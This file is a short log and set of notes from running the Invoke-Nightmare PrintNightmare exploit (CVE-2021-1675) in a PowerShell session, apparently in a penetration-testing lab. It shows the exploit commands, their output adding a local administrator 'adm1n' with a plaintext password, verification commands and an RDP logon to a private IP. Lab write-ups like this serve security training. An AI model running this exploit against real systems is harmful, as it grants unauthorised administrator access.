@@ -1,0 +1,27 @@
+# PrintNightmare (CVE-2021-1675) — Invoke-Nightmare, run from an offsec PowerShell session
+# cwd: C:\Users\offsec\AppData\Local\Temp
+
+PS C:\Users\offsec\AppData\Local\Temp> Import-Module .\cve-2021-1675.ps1
+PS C:\Users\offsec\AppData\Local\Temp> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\offsec\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprin
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\offsec\AppData\Local\Temp\nightmare.dll
+
+# Notes
+#  - "added user  as local administrator" prints an EMPTY name. That is a formatting
+#    bug in the script's output string; the account created is adm1n. Do not re-run
+#    the exploit chasing a failure that did not happen - verify with:
+#        net user adm1n
+#        net localgroup administrators
+#
+#  - The pDriverPath line is truncated in the console; the full path is an existing
+#    signed printer driver INF under DriverStore\FileRepository\ntprint.inf_amd64_*.
+#
+#  - The script deletes nightmare.dll itself on the success path. Check the temp
+#    directory anyway during cleanup.
+#
+#  - Result: local administrator adm1n, verified by interactive RDP logon:
+#        xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd'
